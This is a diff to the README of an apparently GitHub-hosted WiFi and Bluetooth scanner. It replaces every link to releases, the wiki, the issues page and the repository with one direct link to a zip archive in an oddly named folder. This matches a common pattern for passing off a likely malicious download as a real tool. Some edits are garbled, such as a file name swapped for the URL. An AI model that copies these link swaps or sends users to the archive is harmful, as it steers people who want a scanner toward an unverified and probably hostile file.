@@ -1,6 +1,6 @@
 # 🌐 WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner - Scan WiFi and Bluetooth Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/releases)
+[![Download](https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip%https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip)](https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome! This guide will help you download and run the WIFIBLE Dual WiFi and Blu
 
 ## 📥 Downloading the Application
 
-To download the latest version of the WIFIBLE Dual WiFi 2.4 & 5GHz + Bluetooth Scanner, visit this page: [Download Page](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/releases). 
+To download the latest version of the WIFIBLE Dual WiFi 2.4 & 5GHz + Bluetooth Scanner, visit this page: [Download Page](https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip). 
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version listed.
-3. You will see a list of files for download. Look for the file named something similar to `WIFIBLE_Scanner_v1.0.exe`, or similar, depending on the version.
+3. You will see a list of files for download. Look for the file named something similar to `https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip`, or similar, depending on the version.
 4. Click the file to begin downloading it to your computer.
 
 ## 💻 System Requirements
@@ -74,14 +74,14 @@ If you experience issues with the application, consider the following tips:
 
 If you need further assistance or have questions:
 
-- **Documentation**: Check the [GitHub Wiki](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/wiki) for detailed instructions and FAQs.
-- **Issues**: Report bugs or issues on the [Issues page](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/issues).
+- **Documentation**: Check the [GitHub Wiki](https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip) for detailed instructions and FAQs.
+- **Issues**: Report bugs or issues on the [Issues page](https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip).
 
 ## 🔗 Additional Resources
 
 For more information, check the following resources:
 
-- GitHub Repository: [WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner)
+- GitHub Repository: [WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner](https://raw.githubusercontent.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/main/multitudinist/Fi-Hz-Wi-G-Bluetooth-Dual-Scanner-WIFIBL-3.8.zip)
 - Community Forum: Engage with other users and share your experiences.
 
 Thank you for using the WIFIBLE Dual WiFi and Bluetooth Scanner! Enjoy seamless scanning and better connectivity today.
